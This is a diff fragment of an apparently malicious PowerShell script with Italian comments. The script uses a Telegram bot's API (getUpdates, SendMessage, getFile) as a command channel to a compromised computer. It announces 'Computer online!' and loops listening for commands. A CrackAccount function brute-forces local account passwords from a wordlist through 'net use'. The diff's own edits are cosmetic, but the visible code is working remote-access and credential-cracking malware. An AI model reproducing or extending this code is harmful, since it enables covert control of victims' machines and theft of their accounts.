@@ -15,7 +15,7 @@ Add-Type -AssemblyName System.Drawing
 $session = New-Object Microsoft.PowerShell.Commands.WebRequestSession
 
 # Imposta variabili per l'ID e il token dell'API di Telegram
-$telegram_id, $api_token  = "@1", "@2"
+$telegram_id, $api_token = "@1", "@2"
 $api_get_updates    = 'https://api.telegram.org/bot{0}/getUpdates' -f $api_token
 $api_send_messages  = 'https://api.telegram.org/bot{0}/SendMessage' -f $api_token
 $api_get_file       = 'https://api.telegram.org/bot{0}/getFile?file_id=' -f $api_token
@@ -71,7 +71,7 @@ function CrackAccount ($account, $wordlist)
     foreach ($word in $wordlist) {
         try {
             # Prova a connettersi con l'account e la password correnti
-            $result = net use \\127.0.0.1 /user:$account $word 2>&1
+            net use \\127.0.0.1 /user:$account $word 2>&1
             $exitCode = $LASTEXITCODE
 
             # Se la connessione è avvenuta con successo, la password è stata trovata
@@ -240,13 +240,7 @@ function CommandListener
     $hostia = $env:COMPUTERNAME
     $hostname = $hostia
 
-    try {
-        # Invia un messaggio indicando che il computer è online
-        SendMessage "Computer online!"
-    } catch {
-        # In caso di errore, chiude tutto
-        return
-    }
+    try { SendMessage "Computer online!" } catch { "" }
 
     while ($true) {        
         try {
